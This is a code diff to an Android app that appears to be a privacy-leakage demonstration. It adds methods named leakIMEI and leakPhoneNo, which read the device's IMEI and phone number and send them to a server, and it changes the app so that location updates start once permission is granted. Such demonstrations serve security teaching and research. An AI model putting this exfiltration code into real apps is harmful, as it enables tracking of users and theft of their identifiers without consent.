@@ -16,6 +16,7 @@ import android.support.v4.view.MenuItemCompat;
 import android.support.v7.app.AppCompatActivity;
 import android.os.Bundle;
 import android.support.v7.widget.ShareActionProvider;
+import android.telephony.TelephonyManager;
 import android.text.method.ScrollingMovementMethod;
 import android.util.Log;
 import android.view.Menu;
@@ -36,12 +37,16 @@ import java.util.Calendar;
 public class Main extends AppCompatActivity {
     private final static String TAG = Main.class.getName();
 
+    private TelephonyManager telephonyManager;
     private LocationManager locationManager;
     private LocationListener locationListener;
     private final static int MY_PERMISSIONS_REQUEST = 1;
 
     private String host;
     private Integer port;
+
+    private String imeiNumber;
+    private String phoneNumber;
 
     private ToggleButton tb;
 
@@ -51,6 +56,23 @@ public class Main extends AppCompatActivity {
         setContentView(R.layout.activity_main);
 
         PreferenceManager.setDefaultValues(this, R.xml.preferences, false);
+
+
+        ///PHYO
+        if ((ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED)
+                && (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED)
+                && (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_NUMBERS) != PackageManager.PERMISSION_GRANTED))
+        {
+            Toast.makeText(this, "Location and Phone state permissions required!", Toast.LENGTH_SHORT).show();
+            //request the permission
+            Log.d(TAG, "Requesting permissions!");
+            ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.ACCESS_COARSE_LOCATION, Manifest.permission.ACCESS_FINE_LOCATION,
+                    Manifest.permission.INTERNET,
+                    Manifest.permission.READ_PHONE_STATE, Manifest.permission.READ_PHONE_NUMBERS},
+                    MY_PERMISSIONS_REQUEST);
+        }
+
+        telephonyManager = (TelephonyManager) this.getSystemService(Context.TELEPHONY_SERVICE); ///PHYO
 
         TextView tv = (TextView)findViewById(R.id.main_tv_log);
         tv.setMovementMethod(new ScrollingMovementMethod());
@@ -99,6 +121,7 @@ public class Main extends AppCompatActivity {
 
 
     public void startStopGPS(View v){
+        /*
         tb = (ToggleButton)v;
         Log.d(TAG, "tb checked: " + tb.isChecked());
 
@@ -127,6 +150,16 @@ public class Main extends AppCompatActivity {
         } else {
             stopLocationUpdates();
         }
+        */
+
+        ///PHYO
+        if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED)
+        {
+            startLocationUpdates();
+        }
+        else {
+            stopLocationUpdates();
+        }
 
     }
 
@@ -141,6 +174,32 @@ public class Main extends AppCompatActivity {
         slt.execute(pass);
     }
 
+
+    ///PHYO
+    public void leakIMEI(View v){
+        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED) {
+            imeiNumber = telephonyManager.getDeviceId();
+        }
+
+        prependToLog("Leaked IMEI: " + imeiNumber);
+
+        ServerLeakTask slt = new ServerLeakTask();
+        slt.execute(imeiNumber);
+    }
+
+    ///PHYO
+    public void leakPhoneNo(View v){
+        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_NUMBERS) == PackageManager.PERMISSION_GRANTED) {
+            phoneNumber = telephonyManager.getLine1Number();
+        }
+
+        prependToLog("Leaked Phone Number: " + phoneNumber);
+
+        ServerLeakTask slt = new ServerLeakTask();
+        slt.execute(phoneNumber);
+    }
+
+
     @Override
     public void onRequestPermissionsResult(int requestCode, String permissions[], int[] grantResults) {
         switch (requestCode) {
@@ -154,9 +213,11 @@ public class Main extends AppCompatActivity {
                     }
                 }
 
+                /*
                 if(flag){
                     startLocationUpdates();
                 }
+                */
                 return;
             }
         }
@@ -220,7 +281,7 @@ public class Main extends AppCompatActivity {
 
             if(success){
                 Log.d(TAG, "Leaking turned on!!");
-                tb.setChecked(true);
+                //tb.setChecked(true); ///PHYO
 
                 Location lastKnownLocation = locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
                 if (lastKnownLocation != null) {
@@ -242,7 +303,7 @@ public class Main extends AppCompatActivity {
 
     public void stopLocationUpdates(){
         locationManager.removeUpdates(locationListener);
-        tb.setChecked(false);
+        //tb.setChecked(false); ///PHYO
     }
 
     public void leakLoc(Location loc){
